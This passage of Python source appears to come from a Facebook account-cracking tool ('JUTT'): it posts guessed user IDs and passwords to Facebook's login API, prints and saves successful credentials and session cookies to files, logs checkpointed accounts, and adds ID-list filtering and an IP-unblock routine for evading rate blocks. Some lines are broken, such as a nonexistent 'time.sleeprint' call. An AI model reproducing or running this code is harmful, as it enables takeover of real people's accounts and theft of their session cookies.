'X-Fb-Request-Analytics-Tags': 'unknown',
'X-Fb-Http-Engine': 'Liger',
'X-Fb-Client-Ip': 'True',
'X-Fb-Server-Cluster': 'True',
'Content-Length': '847'}
                        po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
                        if 'session_key' in po:
                                uid = str(po['uid'])
                                print(f'\r\033[1;32m [JUTT-OK] '+uid+' | '+pas+'\033[1;37m')
                                os.system('espeak -a 300 " Congratulation,   Dear,  ,User,"')
                                ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                JUTT1 = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={JUTT1};{ckkk}"
                                print(f'\r\033[1;32m [COOKIES] :{W} '+cookie)
                                open('/sdcard/JUTT/JUTT-RNDM-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                                ok.append(uid)
                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                uid = str(po['error']['error_data']['uid'])
                                print(f'\r{W} [JUTT-CP] '+uid+' | '+pas+'\033[1;37m')
                                open('/sdcard/JUTT/JUTT-RNDM-CP.txt','a').write(uid+'|'+pas+'\n')
                                cp.append(uid)
                                break
                        else:
                                continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleeprint(20)
        except Exception as e:
                pass
########SEPRATE#######
def with_names():
                #logo()
                os.system('espeak -a 300 " Enter,   File,  ,Name,"')
                finput = input(f'{W} [{R}+{W}] {W}PUT FILE PATH :')
                sav= input(f'{W} [{R}+{W}] {W}SAVE FILE PATH : ')
                digits = input(f'{W} [{R}+{W}] {W}PUT DIGIT : ').split(',')
                spc=[]
                try:
                        file = open(finput,'r').read().splitlines()
                        xx = open(sav,'a')
                        for mix in file:
                                uid = mix.split('|')[0]
                                nm = mix.split('|')[1]
                                for digit in digits:
                                        if digit in uid:
                                                if uid not in spc:
                                                        if uid.startswith(digit):
                                                                xx.write(uid+'|'+nm+'\n')
                        print(f'{W} [{R}+{W}] {W}SEPRATE DONE!!!!!')
                        print(f'{W} [{R}+{W}] {W}YOUR FILE SAVED IN : %s '%(sav))
                        line()
                        input(f"{W} [{R}+{W}] {W}PRESS ENTER TO BACK  ")
                        line()
                        menu()
                except FileNotFoundError:
                        print(f'{W} [{R}+{W}] {W}FILE NOT FOUND !!!!')
####USED LINE CUTER#####
def used_cutter():
                clear()
                #logo()
                lines=[]
                print(f"{W} [{R}+{W}] {W}\x1b[1;97mEX : /sdcard/file.txt")
                try:
                        file = input(f"{W} [{R}+{W}] {W}\x1b[1;97mPUT FILE  : ")
                except Exception as e:
                        print(f"{W} [{R}+{W}] {W}FILE NOT FOUND!! ");used_cutter()
                digit= int(input(f"{W} [{R}+{W}] {W}\x1b[1;97mPUT LINE :"))
                with open(file,"r") as r:
                        lines = r.readlines()
                with open(file,"w") as w:
                        for num,line in enumerate(lines):
                                if num >= digit:
                                        w.write(line)
                print(f"{W} [{R}+{W}] {W}REMOVED DONE")
                menu()
#######DOUBLE LINK REMOVE#####
def remove_links():
            clear()
            os.system('espeak -a 300 " Enter,   File,  ,Name,"')
            file_path = input(f"{W} [{R}+{W}] {W}FILE PATH : ")
            with open(file_path, "r") as file:
                    lines = file.readlines()
            with open(file_path, "w") as file:
                    file.writelines(set(lines))
            line()
            print(f"{W} [{R}+{W}] {W}SUCCESSFULL REMOVED !\033[0m")
            print(f"{W} [{R}+{W}] {W}IDZ SAVED IN {file_path} \033[0m")
            line()
            input(f"{W} [{R}+{W}] {W}PRESS ENTER TO BACK ")
            menu()
#####_____IP-UNBLOCK_____#####
ip_check_url = "http://ip-api.com/json/"
ip_unblock_url= 'https://updraftplus.com/unblock-ip-address/'
def ipMain():
                clear()
                print(f"{W} [{R}+{W}] {W}          UNBLOCK YOUR IP By JUTT TOOL")
                line()
                print(f"{W} [{R}1{W}] {W}MANUAL")
                print(f"{W} [{R}2{W}] {W}AUTO")
                line()
                m = input(f"{W} [{R}+{W}] {W}SELECT: ")
                if m in ['1','01']:manual()
                else:iAmIPChecker()
def manual():
                clear()
                print(f"{W} [{R}+{W}] {W}TRY TO UNBLOCK YOUR IP BY JUTT TOOL")
                print(f"{W} [{R}+{W}] {W}GO TO SETTING AND OPEN ABOUT PHONE ")
                print(f"{W} [{R}+{W}] {W}COPY YOUR IP FROM ABOUT AND PASTE HERE ")
                line ()
                ip = input(f"{W} [{R}+{W}] {W}PASTE YOUR IP : ")
                line()
                iAmIPUnblocker(ip)
def iAmIPChecker():
                clear()
                print(f"{W} [{R}+{W}] {W}USE FLIGHT MODE FOR 5 SECND BEFORE USE .")
                input(f"{W} [{R}+{W}] {W}PRESS ENTER TO START ...")
                line()
                print(f"{W} [{R}+{W}] {W}DETECTING YOUR IP PLEASE WAIT ...")
                try:
                        getting_network_ip = requests.get(ip_check_url).json()
                        ip = getting_network_ip["query"]
                        print(f"{W} [{R}+{W}] {G}YOUR IP ADRESS : {ip}")
                        iAmIPUnblocker(str(ip))
                except requests.exceptions.ConnectionError:
                        print(f"{W} [{R}+{W}] {R}CHECK YOUR CONNECTION  ")
                except KeyError:
                        print(f"{W} [{R}+{W}] {W}PLEASE CHANGE YOUR NETWORK  !! ..")
                except Exception as e:
                        print(e)
def iAmIPUnblocker(x):
                print(f"{W} [{R}+{W}] {G}TRYING TO UNBLOCK YOUR IP ...")
                try:
                        r2 = requests.get(ip_unblock_url).text
                except requests.exceptions.ConnectionError:
                        print(f"{W} [{R}+{W}] {R}CHECK YOUR NET CONNECTION  ")
                data={}
                ud_unblock_ip = x
                nonce= re.search('name="nonce" value="(.*?)"',r2).group(1)
                data.update({'ud_unblock_ip':ud_unblock_ip,'nonce':nonce,})
                try:
                        po = requests.post(ip_unblock_url,data=data).text
                except requests.exceptions.ConnectionError:
                        print(f"{W} [{R}+{W}] {W}CHECK YOUR NET CONNECTION ")
                if "{W} [{R}+{W}] {W}YOUR IP UNBLOCK FAIL " in po:
                        print(f"{W} [{R}+{W}] {W}TRY AGAIN LATTER... ")
                        line()
                elif "{W} [{R}+{W}] {W}THIS IP RECENTLY UNBLOCKED." in po:
                        exit(f"{W} [{R}+{W}] {W}THIS IP ALREADY UNBLOCKED ")
                else:
                        pass
                        print(f"{W} [{R}+{W}] {G}YOR IP UNBLOCK SUCCESSFULLY")
                        input(f"{W} [{R}+{W}] {W}PRESS ENTER TO BACK HOME ...")
                        menu()
#####____END-Setup____#####
menu()